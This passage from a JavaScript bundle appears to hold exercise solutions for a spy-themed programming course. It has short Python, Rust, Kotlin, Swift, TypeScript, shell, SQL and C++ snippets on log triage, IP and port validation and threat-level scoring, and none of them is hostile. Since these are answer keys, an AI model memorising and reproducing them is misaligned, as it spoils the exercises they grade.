kotlinx.coroutines.flow.StateFlow\nimport kotlinx.coroutines.launch\n\nsealed interface UiState {\n    data object Loading : UiState\n    data class Ready(val alerts: List<String>) : UiState\n}\n\nclass ConsoleViewModel : ViewModel() {\n    private val _state = MutableStateFlow<UiState>(UiState.Loading)\n    val state: StateFlow<UiState> = _state\n\n    fun refresh() {\n        viewModelScope.launch {\n            _state.value = UiState.Loading\n            delay(200)\n            _state.value = UiState.Ready(listOf(\"north up\", \"harbor down\"))\n        }\n    }\n}\n\n@Composable\nfun ConsoleScreen(vm: ConsoleViewModel) {\n    val state by vm.state.collectAsState()\n    var taps by remember { mutableStateOf(0) }\n    Button(onClick = { taps++; vm.refresh() }) { Text(\"Refresh ($taps)\") }\n    when (val s = state) {\n        UiState.Loading -> Text(\"loading...\")\n        is UiState.Ready -> LazyColumn {\n            items(s.alerts) { alert -> Text(alert) }\n        }\n    }\n}\n","kt2":"fun threatLevel(score: Int): String = when (score) {\n    in 90..100 -> \"CRITICAL\"\n    in 60..89 -> \"HIGH\"\n    in 30..59 -> \"MEDIUM\"\n    else -> \"LOW\"\n}\n\nfun countdown() {\n    for (i in 10 downTo 0 step 2) println(\"T-$i\")\n}\n","kt3":"fun tally(ips: List<String>): Map<String, Int> = ips.groupingBy { it }.eachCount()\n\nval ports = mapOf(\"ssh\" to 22, \"https\" to 443, \"dns\" to 53)\n","kt4":"fun scan(host: String, port: Int = 443): String = \"$host:$port\"\n\nfun String.isPrivateIp(): Boolean =\n    startsWith(\"10.\") || startsWith(\"192.168.\") || startsWith(\"172.16.\")\n\nfun repeatScan(times: Int, action: (Int) -> Unit) {\n    for (i in 1..times) action(i)\n}\n\nfun main() {\n    println(scan(\"relay.example\", port = 8443))\n    println(\"10.0.0.4\".isPrivateIp())\n    repeatScan(3) { attempt -> println(\"attempt $attempt\") }\n}\n","kt5":"fun lookup(name: String, db: Map<String, String>): String = db[name] ?: \"unknown\"\n\nfun parseKv(s: String): Map<String, String> =\n    s.split(\";\")\n        .filter { \"=\" in it }\n        .associate {\n            val (k, v) = it.split(\"=\", limit = 2)\n            k.trim() to v.trim()\n        }\n","kt6":"data class Node(val name: String, val strength: Int = 0)\n\nobject Registry {\n    val nodes = mutableListOf<Node>()\n}\n\nclass Session private constructor(val id: String) {\n    companion object {\n        fun create(): Session = Session(\"s-\" + System.nanoTime())\n    }\n}\n\nfun main() {\n    val a = Node(\"north\", 40)\n    val b = a.copy(strength = 90)\n    val (name, strength) = b\n    Registry.nodes += b\n    println(\"$name $strength ${Session.create().id}\")\n}\n","kt7":"class BadPort(val input: String) : Exception(\"bad port: $input\")\n\nfun parsePort(s: String): Int {\n    val p = s.toIntOrNull() ?: throw BadPort(s)\n    require(p in 1..65535) { \"port out of range: $p\" }\n    return p\n}\n\nfun main() {\n    val first = try {\n        parsePort(\"443\")\n    } catch (e: BadPort) {\n        -1\n    }\n    val second = runCatching { parsePort(\"abc\") }.getOrDefault(-1)\n    println(\"$first $second\")\n}\n","kt8":"sealed interface Event\ndata class Login(val user: String) : Event\ndata class Breach(val severity: Int) : Event\ndata object Logout : Event\n\nfun describe(e: Event): String = when (e) {\n    is Login -> \"${e.user} in\"\n    is Breach -> \"BREACH sev ${e.severity}\"\n    Logout -> \"logout\"\n}\n\nenum class Faction(val color: String) {\n    LOGOS(\"#c79bff\"), SENTINEL(\"#5ad1ff\"), MERIDIAN(\"#7dff9a\")\n}\n","kt9":"interface Detector {\n    fun detect(line: String): Boolean\n}\n\nopen class Rule(val name: String) {\n    open fun label(): String = \"rule:$name\"\n}\n\nclass Keyword(private val word: String) : Rule(\"keyword\"), Detector {\n    override fun detect(line: String): Boolean = word in line\n    override fun label(): String = \"keyword:$word\"\n}\n\nfun <T : Comparable<T>> strongest(xs: List<T>): T? = xs.maxOrNull()\n","py1":"def intro(handle, level):\n    return f\"Agent {handle} // level {level}\"\n","py10":"import asyncio\n\nasync def ping(host):\n    await asyncio.sleep(0)\n    return f\"{host}:ok\"\n\nasync def sweep(hosts):\n    return list(await asyncio.gather(*(ping(h) for h in hosts)))\n","py11":"def is_valid_ip(s: str) -> bool:\n    parts = s.split(\".\")\n    if len(parts) != 4:\n        return False\n    for p in parts:\n        if not p.isdigit() or (len(p) > 1 and p[0] == \"0\") or int(p) > 255:\n            return False\n    return True\n","py12":"from collections import Counter\nfrom dataclasses import dataclass\n\ndef is_valid_ip(s: str) -> bool:\n    parts = s.split(\".\")\n    return len(parts) == 4 and all(p.isdigit() and str(int(p)) == p and 0 <= int(p) <= 255 for p in parts)\n\n@dataclass\nclass Summary:\n    total: int\n    fails: int\n    top_ip: str | None\n\ndef analyze(lines) -> Summary:\n    total = 0\n    fail_counts = Counter()\n    for line in lines:\n        parts = line.split()\n        if len(parts) != 2 or not is_valid_ip(parts[0]):\n            continue\n        total += 1\n        if parts[1] == \"FAIL\":\n            fail_counts[parts[0]] += 1\n    top = fail_counts.most_common(1)\n    return Summary(total, sum(fail_counts.values()), top[0][0] if top else None)\n","py2":"def threat_level(score):\n    if score >= 90:\n        return \"CRITICAL\"\n    elif score >= 60:\n        return \"HIGH\"\n    elif score >= 30:\n        return \"MEDIUM\"\n    return \"LOW\"\n","py3":"def unique_fail_ips(logs):\n    return sorted({line.split()[0] for line in logs if line.split()[1:] == [\"FAIL\"]})\n","py4":"def make_counter(start=0):\n    count = start\n    def tick():\n        nonlocal count\n        count += 1\n        return count\n    return tick\n","py5":"def caesar(text, shift):\n    out = []\n    for ch in text:\n        if ch.isalpha():\n            base = ord(\"A\") if ch.isupper() else ord(\"a\")\n            out.append(chr((ord(ch) - base + shift) % 26 + base))\n        else:\n            out.append(ch)\n    return \"\".join(out)\n","py6":"from dataclasses import dataclass\n\n@dataclass\nclass Node:\n    name: str\n    strength: int = 0\n\n    def boost(self, n):\n        self.strength += n\n        return self.strength\n\n    def __str__(self):\n        return f\"{self.name}({self.strength})\"\n","py7":"class AccessDenied(Exception):\n    pass\n\ndef unlock(code):\n    if code == \"0451\":\n        return \"OPEN\"\n    raise AccessDenied(f\"bad code {code!r}\")\n\ndef safe_unlock(code):\n    try:\n        return unlock(code)\n    except AccessDenied:\n        return \"DENIED\"\n","py8":"from collections import Counter\nimport json\n\ndef top_words(text, n):\n    return Counter(text.lower().split()).most_common(n)\n\ndef to_json(text, n):\n    return json.dumps(dict(top_words(text, n)))\n","py9":"import functools\n\ndef chunks(seq, size):\n    for i in range(0, len(seq), size):\n        yield list(seq[i:i + size])\n\ndef shout(fn):\n    @functools.wraps(fn)\n    def wrapper(*args, **kwargs):\n        return fn(*args, **kwargs).upper()\n    return wrapper\n","rs1":"fn intro(handle: &str, level: u32) -> String {\n    format!(\"Agent {} // level {}\", handle, level)\n}\n\nfn main() {\n    let mut counter = 0;\n    counter += 1;\n    println!(\"{} (run {})\", intro(\"neo\", 3), counter);\n}\n","rs10":"use std::sync::{Arc, Mutex};\nuse std::thread;\n\nfn sweep(hosts: Vec<String>) -> usize {\n    let counter = Arc::new(Mutex::new(0usize));\n    let mut handles = vec![];\n    for host in hosts {\n        let c = Arc::clone(&counter);\n        handles.push(thread::spawn(move || {\n            if !host.is_empty() {\n                *c.lock().unwrap() += 1;\n            }\n        }));\n    }\n    for h in handles {\n        h.join().unwrap();\n    }\n    let total = *counter.lock().unwrap();\n    total\n}\n","rs11":"fn longest<'a>(a: &'a str, b: &'a str) -> &'a str {\n    if a.len() >= b.len() { a } else { b }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn picks_longer() {\n        assert_eq!(longest(\"abc\", \"a\"), \"abc\");\n    }\n\n    #[test]\n    fn ties_go_to_first() {\n        assert_eq!(longest(\"ab\", \"cd\"), \"ab\");\n    }\n}\n","rs12":"use std::fmt;\n\n#[derive(Debug, PartialEq)]\nenum Status {\n    Ok,\n    Fail,\n}\n\n#[derive(Debug)]\nstruct Record {\n    ip: String,\n    status: Status,\n}\n\nfn parse(line: &str) -> Result<Record, String> {\n    let mut parts = line.split_whitespace();\n    let ip = parts.next().ok_or(\"missing ip\")?;\n    let status = match parts.next() {\n        Some(\"OK\") => Status::Ok,\n        Some(\"FAIL\") => Status::Fail,\n        other => return Err(format!(\"bad status: {:?}\", other)),\n    };\n    if parts.next().is_some() {\n        return Err(\"too many fields\".into());\n    }\n    Ok(Record { ip: ip.to_string(), status })\n}\n\nstruct Summary {\n    total: usize,\n    fails: usize,\n}\n\nimpl fmt::Display for Summary {\n    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {\n        write!(f, \"{} total / {} fails\", self.total, self.fails)\n    }\n}\n\nfn analyze(lines: &[&str]) -> Summary {\n    let records: Vec<Record> = lines.iter().filter_map(|l| parse(l).ok()).collect();\n    let fails = records.iter().filter(|r| r.status == Status::Fail).count();\n    Summary { total: records.len(), fails }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn counts_fails() {\n        let s = analyze(&[\"1.1.1.1 FAIL\", \"2.2.2.2 OK\", \"junk\"]);\n        assert_eq!((s.total, s.fails), (2, 1));\n    }\n\n    #[test]\n    fn rejects_bad_lines() {\n        assert!(parse(\"x\").is_err());\n    }\n}\n","rs2":"fn threat_level(score: u32) -> &'static str {\n    match score {\n        90..=u32::MAX => \"CRITICAL\",\n        60..=89 => \"HIGH\",\n        30..=59 => \"MEDIUM\",\n        _ => \"LOW\",\n    }\n}\n","rs3":"use std::collections::HashMap;\n\nfn tally(ips: &[String]) -> HashMap<String, u32> {\n    let mut counts = HashMap::new();\n    for ip in ips {\n        *counts.entry(ip.clone()).or_insert(0) += 1;\n    }\n    counts\n}\n","rs4":"fn count_words(text: &str) -> usize {\n    text.split_whitespace().count()\n}\n\nfn redact(msg: &mut String) {\n    *msg = String::from(\"[REDACTED]\");\n}\n","rs5":"fn caesar(text: &str, shift: u8) -> String {\n    text.chars()\n        .map(|c| {\n            if c.is_ascii_alphabetic() {\n                let base = if c.is_ascii_uppercase() { b'A' } else { b'a' };\n                (((c as u8 - base + shift % 26) % 26) + base) as char\n            } else {\n                c\n            }\n        })\n        .collect()\n}\n","rs6":"#[derive(Debug)]\nstruct Node {\n    name: String,\n    strength: u32,\n}\n\nimpl Node {\n    fn new(name: &str) -> Self {\n        Self { name: name.to_string(), strength: 0 }\n    }\n    fn boost(&mut self, by: u32) -> u32 {\n        self.strength += by;\n        self.strength\n    }\n}\n\nenum Event {\n    Login(String),\n    Breach(u8),\n    Logout,\n}\n\nfn describe(e: &Event) -> String {\n    match e {\n        Event::Login(user) => format!(\"login {user}\"),\n        Event::Breach(sev) => format!(\"breach {sev}\"),\n        Event::Logout => \"logout\".to_string(),\n    }\n}\n","rs7":"#[derive(Debug)]\nenum ParseError {\n    Empty,\n    BadPort(String),\n}\n\nfn parse_port(s: &str) -> Result<u16, ParseError> {\n    if s.is_empty() {\n        return Err(ParseError::Empty);\n    }\n    s.parse::<u16>().map_err(|_| ParseError::BadPort(s.to_string()))\n}\n\nfn ports(list: &[&str]) -> Result<Vec<u16>, ParseError> {\n    let mut out = Vec::new();\n    for s in list {\n        out.push(parse_port(s)?);\n    }\n    Ok(out)\n}\n","rs8":"trait Detector {\n    fn detect(&self, line: &str) -> bool;\n}\n\nstruct Keyword(String);\n\nimpl Detector for Keyword {\n    fn detect(&self, line: &str) -> bool {\n        line.contains(&self.0)\n    }\n}\n\nfn count_hits<D: Detector>(d: &D, lines: &[&str]) -> usize {\n    lines.iter().filter(|l| d.detect(l)).count()\n}\n","rs9":"fn fail_ips(lines: &[&str]) -> Vec<String> {\n    lines\n        .iter()\n        .filter(|l| l.ends_with(\"FAIL\"))\n        .map(|l| l.split_whitespace().next().unwrap_or(\"\").to_string())\n        .collect()\n}\n","sh1":"mkdir -p ops/intel/2026\ncd ops/intel/2026\ntouch brief.txt\nls -la\n","sh10":"curl -fsS -H \"Authorization: Bearer $TOKEN\" https://relay.example/api/nodes | jq -r '.nodes[] | select(.online == false) | .name'\n","sh11":"export RELAY_ENV=prod\nexport PATH=\"$HOME/ops/bin:$PATH\"\n*/15 * * * * /opt/ops/sweep.sh >> /var/log/sweep.log 2>&1\n","sh12":"#!/usr/bin/env bash\nset -euo pipefail\n[[ -r \"${1:-}\" ]] || { echo \"usage: triage.sh <log>\" >&2; exit 1; }\ntop_ips() {\n  awk '{ print $1 }' \"$1\" | sort | uniq -c | sort -nr | head -n 3\n}\ntop_ips \"$1\" | while read -r count ip; do\n  if (( count > 20 )) || [[ $count -gt 20 ]]; then\n    echo \"block $ip ($count hits)\"\n  fi\ndone\nexit 0\n","sh2":"grep -i BLACKOUT relay.log | grep -v TEST | wc -l\n","sh3":"TARGET=\"relay.log\"\nSTAMP=$(date +%F)\nHITS=$(grep -c FAIL \"$TARGET\")\necho \"$STAMP: $HITS failures in $TARGET\"\n","sh4":"#!/usr/bin/env bash\nif [[ -z \"$1\" ]]; then\n  echo \"usage: $0 <file>\"\n  exit 1\nelif [[ -f \"$1\" ]]; then\n  echo \"scanning $1\"\nelse\n  echo \"not found: $1\"\n  exit 2\nfi\n","sh5":"while IFS= read -r host; do\n  ping -c 1 \"$host\" &>/dev/null && echo \"$host up\" || echo \"$host down\"\ndone < hosts.txt\n","sh6":"archive() {\n  local src=\"$1\"\n  local dest=\"${2:-/tmp}\"\n  [[ -e \"$src\" ]] || return 1\n  tar -czf \"$dest/$(basename \"$src\").tar.gz\" \"$src\"\n}\narchive \"$@\"\n","sh7":"awk '{ print $1 }' access.log | sort | uniq -c | sort -nr | head -n 5\nsed 's/token=[^ ]*/token=REDACTED/g' app.log > clean.log\n","sh8":"chmod 700 sweep.sh\nchmod 600 ~/.ssh/id_ed25519\nPID=$(pgrep cryptominer)\nkill -TERM \"$PID\"\n","sh9":"#!/usr/bin/env bash\nset -euo pipefail\nWORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\ncurl -fsS https://relay.example/health > \"$WORK/health.json\" || { echo \"relay down\" >&2; exit 3; }\n","sql1":"SELECT name AS handle, faction FROM agents;\n","sql10":"CREATE INDEX idx_events_ip_status ON events(ip, status); CREATE UNIQUE INDEX idx_agents_name ON agents(name);\n","sql11":"SELECT name, faction, r FROM (SELECT name, faction, RANK() OVER (PARTITION BY faction ORDER BY rank DESC) AS r FROM agents) WHERE r = 1 ORDER BY faction;\n","sql12":"CREATE VIEW threat_board AS SELECT e.ip, COUNT(*) AS fails, COUNT(DISTINCT a.name) AS agents, MAX(e.ts) AS last_seen FROM events e JOIN agents a ON a.id=e.agent_id WHERE e.status='failed' GROUP BY e.ip; SELECT * FROM threat_board ORDER BY fails DESC, ip;\n","sql2":"SELECT name, rank FROM agents WHERE faction IN ('sentinel','logos') AND rank >= 3 ORDER BY name;\n","sql3":"SELECT DISTINCT ip FROM events WHERE status = 'failed' ORDER BY ip LIMIT 3;\n","sql4":"SELECT ip, COUNT(*) AS fails FROM events WHERE status='failed' GROUP BY ip HAVING COUNT(*) >= 2 ORDER BY fails DESC, ip;\n","sql5":"SELECT a.name, e.ip, e.ts FROM events e JOIN agents a ON a.id = e.agent_id WHERE e.status='failed' ORDER BY e.id;\n","sql6":"SELECT a.name FROM agents a LEFT JOIN events e ON e.agent_id = a.id WHERE e.id IS NULL ORDER BY a.name;\n","sql7":"WITH f AS (SELECT agent_id, COUNT(*) c FROM events WHERE status='failed' GROUP BY agent_id) SELECT a.name, f.c FROM f JOIN agents a ON a.id=f.agent_id WHERE f.c=(SELECT MAX(c) FROM f) ORDER BY a.name;\n","sql8":"CREATE TABLE safehouses (id INTEGER PRIMARY KEY, district TEXT NOT NULL, capacity INTEGER NOT NULL CHECK (capacity > 0), node_id INTEGER REFERENCES nodes(id));\n","sql9":"BEGIN; UPDATE nodes SET online=0 WHERE district='old quarter'; INSERT INTO nodes (district, online) VALUES ('tunnel',1); DELETE FROM nodes WHERE district='harbor' AND online=0; COMMIT;\n","sw1":"func intro(handle: String, level: Int) -> String {\n    \"Agent \\(handle) // level \\(level)\"\n}\n\nlet agent = \"neo\"\nvar runs = 0\nruns += 1\nprint(intro(handle: agent, level: 3), runs)\n","sw10":"func ping(_ host: String) async -> Bool {\n    try? await Task.sleep(for: .milliseconds(10))\n    return !host.isEmpty\n}\n\nactor Ledger {\n    private var hits = 0\n    func record() { hits += 1 }\n    func total() -> Int { hits }\n}\n\nfunc sweep(_ hosts: [String]) async -> Int {\n    await withTaskGroup(of: Bool.self) { group in\n        for h in hosts { group.addTask { await ping(h) } }\n        var up = 0\n        for await ok in group where ok { up += 1 }\n        return up\n    }\n}\n","sw11":"import Testing\n\nenum ScanError: Error { case bad }\n\nprivate func parsePort(_ s: String) throws -> Int {\n    guard let p = Int(s), (1...65535).contains(p) else { throw ScanError.bad }\n    return p\n}\n\n@Test func parsesValidPort() throws {\n    #expect(try parsePort(\"443\") == 443)\n}\n\n@Test(\"rejects garbage\", arguments: [\"\", \"abc\", \"70000\"])\nfunc rejects(_ input: String) {\n    #expect(throws: ScanError.self) { try parsePort(input) }\n}\n","sw12":"import SwiftUI\n\n@Observable final class Monitor {\n    var alerts: [String] = []\n    func refresh() async {\n        try? await Task.sleep(for: .milliseconds(200))\n        alerts.append(\"ping \\(Date.now.formatted(date: .omitted, time: .standard))\")\n    }\n}\n\nstruct ConsoleView: View {\n    @State private var monitor = Monitor()\n    @State private var filter = \"\"\n\n    var body: some View {\n        NavigationStack {\n            List(monitor.alerts.filter { filter.isEmpty || $0.contains(filter) }, id: \\.self) { alert in\n                Text(alert).font(.system(.body, design: .monospaced))\n            }\n            .searchable(text: $filter)\n            .toolbar {\n                Button(\"Refresh\") {\n                    Task { await monitor.refresh() }\n                }\n            }\n            .navigationTitle(\"Console\")\n        }\n    }\n}\n","sw2":"func threatLevel(_ score: Int) -> String {\n    switch score {\n    case 90...: return \"CRITICAL\"\n    case 60..<90: return \"HIGH\"\n    case 30..<60: return \"MEDIUM\"\n    default: return \"LOW\"\n    }\n}\n\nfunc validPin(_ pin: String) -> Bool {\n    guard pin.count == 6, pin.allSatisfy(\\.isNumber) else { return false }\n    return true\n}\n","sw3":"func lookup(_ name: String, in db: [String: String]) -> String {\n    guard let ip = db[name] else { return db[\"default\"] ?? \"unknown\" }\n    return ip\n}\n","sw4":"func tally(_ ips: [String]) -> [String: Int] {\n    var counts: [String: Int] = [:]\n    for ip in ips { counts[ip, default: 0] += 1 }\n    return counts\n}\n\nfunc loud(_ ports: [Int]) -> [Int] {\n    ports.filter { $0 > 1024 }.map { $0 * 10 }\n}\n","sw5":"var handlers: [() -> Void] = []\n\nfunc scan(host: String, port: Int = 443) -> String {\n    \"\\(host):\\(port)\"\n}\n\nfunc retry(times: Int, _ op: () -> Bool) -> Bool {\n    for _ in 0..<times where op() { return true }\n    return false\n}\n\nlet ok = retry(times: 3) { Bool.random() }\n\nfunc onAlert(_ h: @escaping () -> Void) {\n    handlers.append(h)\n}\n","sw6":"struct Node {\n    var name: String\n    var strength = 0\n    var isHot: Bool { strength > 80 }\n    mutating func boost(_ by: Int) { strength += by }\n}\n\nfinal class Session {\n    let id: String\n    init(id: String) { self.id = id }\n}\n","sw7":"enum ScanError: Error {\n    case empty\n    case badPort(String)\n}\n\nfunc parsePort(_ s: String) throws -> Int {\n    guard !s.isEmpty else { throw ScanError.empty }\n    guard let p = Int(s), (1...65535).contains(p) else { throw ScanError.badPort(s) }\n    return p\n}\n\ndo {\n    let p = try parsePort(\"443\")\n    print(p)\n} catch {\n    print(\"failed: \\(error)\")\n}\n","sw8":"enum Event {\n    case login(user: String)\n    case breach(severity: Int)\n    case logout\n}\n\nfunc describe(_ e: Event) -> String {\n    switch e {\n    case .login(let user): return \"login \\(user)\"\n    case .breach(let s) where s >= 8: return \"CRITICAL breach\"\n    case .breach(let s): return \"breach \\(s)\"\n    case .logout: return \"logout\"\n    }\n}\n\nenum Faction: String, CaseIterable { case logos, sentinel, meridian }\n","sw9":"protocol Detector {\n    func detect(_ line: String) -> Bool\n}\n\nextension Detector {\n    func count(in lines: [String]) -> Int { lines.filter(detect).count }\n}\n\nstruct Keyword: Detector {\n    let word: String\n    func detect(_ line: String) -> Bool { line.contains(word) }\n}\n\nfunc strongest<T: Comparable>(_ xs: [T]) -> T? { xs.max() }\n","ts1":"function intro(handle: string, level: number): string {\n  return `Agent ${handle} // level ${level}`;\n}\n","ts10":"async function sweep(hosts: string[], ping: (h: string) => Promise<number>): Promise<Record<string, number>> {\n  const times = await Promise.all(hosts.map(h => ping(h)));\n  const out: Record<string, number> = {};\n  hosts.forEach((h, i) => { out[h] = times[i]; });\n  return out;\n}\n","ts11":"type Result<T> = { ok: true; value: T } | { ok: false; error: string };\n\nfunction parsePort(s: string): Result<number> {\n  if (!/^\\d+$/.test(s)) return { ok: false, error: \"invalid port\" };\n  const n = Number(s);\n  return n >= 1 && n <= 65535 ? { ok: true, value: n } : { ok: false, error: \"invalid port\" };\n}\nfunction isOk<T>(r: Result<T>): r is { ok: true; value: T } {\n  return r.ok;\n}\n","ts12":"type Result<T> = { ok: true; value: T } | { ok: false; error: string };\n\ntype Ev = { kind: \"fail\"; ip: string } | { kind: \"ok\"; ip: string };\ninterface Summary { total: number; fails: number; topIp: string | null; errors: number }\n\nfunction parse(line: string): Result<Ev> {\n  const [ip, status, ...extra] = line.trim().split(/\\s+/);\n  if (!ip || extra.length || (status !== \"OK\" && status !== \"FAIL\")) return { ok: false, error: `bad line: ${line}` };\n  return { ok: true, value: { kind: status === \"FAIL\" ? \"fail\" : \"ok\", ip } };\n}\n\nasync function analyze(src: () => Promise<string[]>): Promise<Summary> {\n  const lines = await src();\n  const counts = new Map<string, number>();\n  let total = 0, fails = 0, errors = 0;\n  for (const line of lines) {\n    const r = parse(line);\n    if (!r.ok) { errors++; continue; }\n    total++;\n    if (r.value.kind === \"fail\") { fails++; counts.set(r.value.ip, (counts.get(r.value.ip) ?? 0) + 1); }\n  }\n  let topIp: string | null = null, best = 0;\n  for (const [ip, n] of counts) if (n > best) { best = n; topIp = ip; }\n  return { total, fails, topIp, errors };\n}\n","ts2":"type Level = \"LOW\" | \"MEDIUM\" | \"HIGH\" | \"CRITICAL\";\nfunction threatLevel(score: number): Level {\n  if (score >= 90) return \"CRITICAL\";\n  if (score >= 60) return \"HIGH\";\n  if (score >= 30) return \"MEDIUM\";\n  return \"LOW\";\n}\n","ts3":"function tally(items: string[]): Record<string, number> {\n  const out: Record<string, number> = {};\n  for (const x of items) out[x] = (out[x] ?? 0) + 1;\n  return out;\n}\nfunction top(items: string[]): [string, number] | undefined {\n  let best: [string, number] | undefined;\n  for (const [k, v] of Object.entries(tally(items))) if (!best || v > best[1]) best = [k, v];\n  return best;\n}\n","ts4":"interface Report {\n  readonly id: number;\n  source: string;\n  verified?: boolean;\n}\nfunction summarize(r: Report): string {\n  return `#${r.id} from ${r.source} [${r.verified === true ? \"verified\" : \"unverified\"}]`;\n}\n","ts5":"type Predicate<T> = (x: T) => boolean;\nfunction where<T>(items: T[], p: Predicate<T>): T[] {\n  return items.filter(p);\n}\nfunction not<T>(p: Predicate<T>): Predicate<T> {\n  return x => !p(x);\n}\n","ts6":"class Vault {\n  private secrets = new Map<string, string>();\n  constructor(private readonly owner: string) {}\n  store(k: string, v: string): void { this.secrets.set(k, v); }\n  read(k: string): string | undefined { return this.secrets.get(k); }\n  get size(): number { return this.secrets.size; }\n  describe(): string { return `${this.owner}: ${this.size} secrets`; }\n}\n","ts7":"function pluck<T, K extends keyof T>(items: T[], key: K): T[K][] {\n  return items.map(i => i[key]);\n}\nfunction indexBy<T, K extends keyof T>(items: T[], key: K): Map<T[K], T> {\n  return new Map(items.map(i => [i[key], i] as [T[K], T]));\n}\n","ts8":"type Event =\n  | { kind: \"login\"; user: string }\n  | { kind: \"breach\"; severity: number }\n  | { kind: \"logout\"; user: string };\n\nfunction describe(e: Event): string {\n  switch (e.kind) {\n    case \"login\": return `${e.user} in`;\n    case \"breach\": return `BREACH sev ${e.severity}`;\n    case \"logout\": return `${e.user} out`;\n    default: {\n      const unreachable: never = e;\n      return unreachable;\n    }\n  }\n}\n","ts9":"function patch<T>(obj: T, changes: Partial<T>): T {\n  return { ...obj, ...changes };\n}\nfunction redact<T, K extends keyof T>(obj: T, key: K): Omit<T, K> {\n  const { [key]: _removed, ...rest } = obj;\n  return rest as Omit<T, K>;\n}\n"}); })(typeof window !== "undefined" ? window : globalThis);
+(function (g) { const RA = g.RA = g.RA || {}; RA.SOLUTIONS = Object.assign(RA.SOLUTIONS || {}, {"bc1":"print(\"Hello, Operator\")\n","bc10":"def total(numbers):\n    result = 0\n    for n in numbers:\n        result += n\n    return result\n","bc11":"def count_fails(statuses):\n    count = 0\n    for s in statuses:\n        if s == \"FAIL\":\n            count += 1\n    return count\n","bc12":"def report(statuses):\n    if len(statuses) == 0:\n        return \"no data\"\n    fails = 0\n    for s in statuses:\n        if s == \"FAIL\":\n            fails += 1\n    return f\"{fails} of {len(statuses)} failed\"\n","bc2":"handle = \"neo\"\nlevel = 1\nprint(handle)\n","bc3":"nodes = 12\noffline = 5\n\nonline = nodes - offline\nprint(online)\n","bc4":"name = \"neo\"\n\nmessage = \"Agent \" + name\nbadge = f\"[{name}] online\"\nprint(message)\nprint(badge)\n","bc5":"clearance = 4\n\nif clearance >= 3:\n    print(\"ACCESS GRANTED\")\nelse:\n    print(\"ACCESS DENIED\")\n","bc6":"for n in range(1, 6):\n    print(n)\n","bc7":"agents = [\"neo\", \"trinity\", \"morpheus\"]\nprint(len(agents))\nprint(agents[0])\nagents.append(\"tank\")\nfor name in agents:\n    print(name)\n","bc8":"def greet(name):\n    return \"Welcome, \" + name\n\nprint(greet(\"neo\"))\n","bc9":"def access(clearance):\n    if clearance >= 3:\n        return \"GRANTED\"\n    else:\n        return \"DENIED\"\n","cpp1":"#include <iostream>\n#include <string>\n\nstd::string intro(const std::string& handle, int level) {\n    return \"Agent \" + handle + \" // level \" + std::to_string(level);\n}\n\nint main() {\n    const std::string handle = \"neo\";\n    auto line = intro(handle, 3);\n    std::cout << line << '\\n';\n}\n","cpp10":"#include <algorithm>\n#include <numeric>\n#include <ranges>\n#include <string>\n#include <vector>\n#include <cstdio>\n\nstruct Hit {\n    std::string ip;\n    int count;\n};\n\nint analyze(std::vector<Hit>& hits) {\n    std::ranges::sort(hits, std::greater{}, &Hit::count);\n    auto it = std::find_if(hits.begin(), hits.end(), [](const Hit& h) { return h.ip.starts_with(\"10.\"); });\n    int total = std::accumulate(hits.begin(), hits.end(), 0, [](int acc, const Hit& h) { return acc + h.count; });\n    int noisy = 0;\n    for (const auto& h : hits | std::views::filter([](const Hit& h) { return h.count > 20; })) {\n        noisy += h.count;\n    }\n    if (it != hits.end() && noisy > 0) std::printf(\"first internal: %s, noisy total %d\\n\", it->ip.c_str(), noisy);\n    return total;\n}\n","cpp11":"#include <thread>\n#include <mutex>\n#include <atomic>\n#include <vector>\n#include <string>\n#include <iostream>\n\nbool ping(const std::string&) { return true; }\n\nint sweep(const std::vector<std::string>& hosts) {\n    std::atomic<int> up{0};\n    std::mutex log_mutex;\n    std::vector<std::thread> workers;\n    for (const auto& h : hosts) {\n        workers.emplace_back([&up, &log_mutex, &h] {\n            if (ping(h)) {\n                ++up;\n                std::lock_guard<std::mutex> lock(log_mutex);\n                std::cout << h << \" up\\n\";\n            }\n        });\n    }\n    for (auto& t : workers) t.join();\n    return up.load();\n}\n","cpp12":"#include <memory>\n#include <stdexcept>\n#include <utility>\n#include <cstddef>\n#include <gtest/gtest.h>\n\nclass Buffer {\npublic:\n    explicit Buffer(std::size_t n) : data_(std::make_unique<int[]>(n)), size_(n) {}\n    Buffer(const Buffer&) = delete;\n    Buffer& operator=(const Buffer&) = delete;\n    Buffer(Buffer&& other) noexcept : data_(std::move(other.data_)), size_(std::exchange(other.size_, 0)) {}\n    Buffer& operator=(Buffer&& other) noexcept {\n        data_ = std::move(other.data_);\n        size_ = std::exchange(other.size_, 0);\n        return *this;\n    }\n    int& at(std::size_t i) {\n        if (i >= size_) throw std::out_of_range(\"Buffer::at\");\n        return data_[i];\n    }\n    std::size_t size() const { return size_; }\n\nprivate:\n    std::unique_ptr<int[]> data_;\n    std::size_t size_;\n};\n\nTEST(BufferTest, ThrowsOutOfRange) {\n    Buffer b(4);\n    EXPECT_THROW(b.at(4), std::out_of_range);\n}\n\nTEST(BufferTest, MoveTransfersOwnership) {\n    Buffer a(3);\n    Buffer b(std::move(a));\n    EXPECT_EQ(b.size(), 3u);\n    EXPECT_EQ(a.size(), 0u);\n}\n","cpp2":"enum class Level { Low, Medium, High, Critical };\n\nLevel classify(int score) {\n    if (score >= 90) return Level::Critical;\n    else if (score >= 60) return Level::High;\n    else if (score >= 30) return Level::Medium;\n    else return Level::Low;\n}\n\nconst char* name(Level l) {\n    switch (l) {\n        case Level::Low: return \"LOW\";\n        case Level::Medium: return \"MEDIUM\";\n        case Level::High: return \"HIGH\";\n        case Level::Critical: return \"CRITICAL\";\n    }\n    return \"?\";\n}\n","cpp3":"#include <iostream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n\nstd::unordered_map<std::string, int> tally(const std::vector<std::string>& ips) {\n    std::unordered_map<std::string, int> counts;\n    for (const auto& ip : ips) {\n        ++counts[ip];\n    }\n    return counts;\n}\n\nvoid report(const std::vector<std::string>& ips) {\n    for (const auto& [ip, n] : tally(ips)) {\n        std::cout << ip << \": \" << n << '\\n';\n    }\n}\n","cpp4":"#include <string>\n#include <sstream>\n\nstd::size_t count_words(const std::string& text) {\n    std::istringstream in(text);\n    std::string word;\n    std::size_t n = 0;\n    while (in >> word) ++n;\n    return n;\n}\n\nvoid redact(std::string& msg) {\n    msg = \"[REDACTED]\";\n}\n\nstd::string scan(const std::string& host, int port = 